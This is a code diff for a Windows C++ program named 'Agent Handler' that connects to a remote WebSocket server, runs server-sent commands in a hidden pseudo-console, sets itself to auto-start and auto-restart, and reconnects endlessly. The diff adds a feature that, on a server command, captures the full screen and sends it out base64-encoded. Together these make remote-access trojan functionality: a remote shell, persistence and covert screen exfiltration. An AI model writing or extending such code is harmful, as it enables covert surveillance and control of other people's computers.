@@ -13,14 +13,19 @@
 #include <memory>
 #include <shlobj.h>
 #include <lmcons.h>
+#include <gdiplus.h>
+#include <vector>
+#include <algorithm>
 #include "json.hpp"
 
+using namespace Gdiplus;
 using json = nlohmann::json;
 
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "taskschd.lib")
 #pragma comment(lib, "comsupp.lib")
+#pragma comment(lib, "gdiplus.lib")
 
 
 namespace Config {
@@ -31,9 +36,9 @@ namespace Config {
 	const bool DEBUG_MODE = false;                   // Set false for production
 #endif
     // WebSocket Server Configuration
-    const wchar_t* SERVER_HOST = L"example.com";       // Change to your server IP/domain
-    const int SERVER_PORT = 443;                    // Change to your server port
-    const bool USE_SSL = true;                      // Set true for wss:// (secure)
+    const wchar_t* SERVER_HOST = L"localhost";       // Change to your server IP/domain
+    const int SERVER_PORT = 9991;                    // Change to your server port
+    const bool USE_SSL = false;                      // Set true for wss:// (secure)
 
     // Application Settings
     const wchar_t* APP_NAME = L"Agent Handler";        // Name in registry
@@ -68,6 +73,7 @@ struct AppState {
     std::mutex wsMutex;
     int reconnectAttempts = 0;
     DWORD lastPingTime = 0;
+    ULONG_PTR gdiplusToken;
 } g_state;
 
 typedef HRESULT(WINAPI* PFN_CreatePseudoConsole)(COORD, HANDLE, HANDLE, DWORD, HPCON*);
@@ -162,6 +168,129 @@ std::string GetHWID() {
     }
 
     return hwid;
+}
+
+// Base64 Encoding
+static const std::string base64_chars =
+"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+"abcdefghijklmnopqrstuvwxyz"
+"0123456789+/";
+
+std::string Base64Encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
+    std::string ret;
+    int i = 0;
+    int j = 0;
+    unsigned char char_array_3[3];
+    unsigned char char_array_4[4];
+
+    while (in_len--) {
+        char_array_3[i++] = *(bytes_to_encode++);
+        if (i == 3) {
+            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
+            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
+            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
+            char_array_4[3] = char_array_3[2] & 0x3f;
+
+            for (i = 0; (i < 4); i++)
+                ret += base64_chars[char_array_4[i]];
+            i = 0;
+        }
+    }
+
+    if (i) {
+        for (j = i; j < 3; j++)
+            char_array_3[j] = '\0';
+
+        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
+        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
+        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
+        char_array_4[3] = char_array_3[2] & 0x3f;
+
+        for (j = 0; (j < i + 1); j++)
+            ret += base64_chars[char_array_4[j]];
+
+        while (i++ < 3)
+            ret += '=';
+    }
+
+    return ret;
+}
+
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
+    UINT  num = 0;          // number of image encoders
+    UINT  size = 0;         // size of the image encoder array in bytes
+
+    GetImageEncodersSize(&num, &size);
+    if (size == 0) return -1;  // Failure
+
+    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
+    if (pImageCodecInfo == NULL) return -1;  // Failure
+
+    GetImageEncoders(num, size, pImageCodecInfo);
+
+    for (UINT j = 0; j < num; ++j) {
+        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
+            *pClsid = pImageCodecInfo[j].Clsid;
+            free(pImageCodecInfo);
+            return j;  // Success
+        }
+    }
+
+    free(pImageCodecInfo);
+    return -1;  // Failure
+}
+
+std::string CaptureScreenBase64() {
+    int x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    int y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
+    int x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    int y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+
+    HDC hScreen = GetDC(NULL);
+    HDC hDC = CreateCompatibleDC(hScreen);
+    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, x2, y2);
+    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
+
+    BitBlt(hDC, 0, 0, x2, y2, hScreen, x1, y1, SRCCOPY);
+
+    // Create GDI+ Bitmap from HBITMAP
+    Bitmap* bitmap = new Bitmap(hBitmap, NULL);
+    
+    // Save to memory stream
+    IStream* pStream = NULL;
+    CreateStreamOnHGlobal(NULL, TRUE, &pStream);
+    
+    CLSID clsid;
+    GetEncoderClsid(L"image/png", &clsid);
+    
+    // Resize down if too big to save bandwidth (Optional, keeping full res for now but good to note)
+    // For now we'll save as PNG to the stream
+    bitmap->Save(pStream, &clsid, NULL);
+    
+    // Get bytes from stream
+    LARGE_INTEGER liZero = {};
+    ULARGE_INTEGER pos = {};
+    pStream->Seek(liZero, STREAM_SEEK_SET, &pos);
+    
+    // Get size
+    STATSTG statstg;
+    pStream->Stat(&statstg, STATFLAG_NONAME);
+    ULONG streamSize = (ULONG)statstg.cbSize.QuadPart;
+    
+    std::vector<BYTE> buffer(streamSize);
+    ULONG bytesRead;
+    pStream->Seek(liZero, STREAM_SEEK_SET, &pos);
+    pStream->Read(buffer.data(), streamSize, &bytesRead);
+    
+    // Clean up
+    pStream->Release();
+    delete bitmap;
+    SelectObject(hDC, old_obj);
+    DeleteObject(hBitmap);
+    DeleteDC(hDC);
+    ReleaseDC(NULL, hScreen);
+    
+    return Base64Encode(buffer.data(), buffer.size());
 }
 
 // Get device name
@@ -596,6 +725,7 @@ void WebSocketReceiveLoop() {
         try {
             std::string msgStr((char*)buffer.data(), bytesRead);
             json msg = json::parse(msgStr);
+            printf("Data: %s\n", msgStr.c_str());
 
             if (msg["type"] == "input" && msg.contains("data")) {
                 std::string data = msg["data"];
@@ -606,6 +736,27 @@ void WebSocketReceiveLoop() {
                 std::string cmd = msg["command"].get<std::string>() + "\r\n";
                 DWORD written;
                 WriteFile(g_state.hPipeOut, cmd.c_str(), (DWORD)cmd.length(), &written, nullptr);
+            }
+            else if (msg["type"] == "action" && msg.contains("action")) {
+                std::string action = msg["action"];
+                if (action == "screenshot") {
+                    printf("Screenshotting...\n");
+                    std::string base64Img = CaptureScreenBase64();
+                    
+                    json resp;
+                    resp["type"] = "screenshot";
+                    resp["data"] = base64Img;
+                    
+                    std::string msgStr = resp.dump();
+                    
+                    std::lock_guard<std::mutex> lock(g_state.wsMutex);
+                    if (g_state.hWebSocket && g_state.wsConnected) {
+                        printf("Sending screenshot...\n");
+                        WinHttpWebSocketSend(g_state.hWebSocket,
+                            WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
+                            (PVOID)msgStr.c_str(), (DWORD)msgStr.length());
+                    }
+                }
             }
             else if (msg["type"] == "resize" && msg.contains("cols") && msg.contains("rows")) {
                 COORD size = { (SHORT)msg["cols"].get<int>(), (SHORT)msg["rows"].get<int>() };
@@ -754,6 +905,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine,
     printf("Auto-Start: %s\n", Config::AUTO_START ? "ON" : "OFF");
     printf("Auto-Restart: %s\n", Config::AUTO_RESTART_ON_CRASH ? "ON" : "OFF");
     printf("Max Reconnect Attempts: %s\n", Config::MAX_RECONNECT_ATTEMPTS == 0 ? "INFINITE" : std::to_string(Config::MAX_RECONNECT_ATTEMPTS).c_str());
+
+    // Initialize GDI+
+    GdiplusStartupInput gdiplusStartupInput;
+    GdiplusStartup(&g_state.gdiplusToken, &gdiplusStartupInput, NULL);
 
     SetAutoStart(exePath);
     CreateAutoRestartTask(exePath);
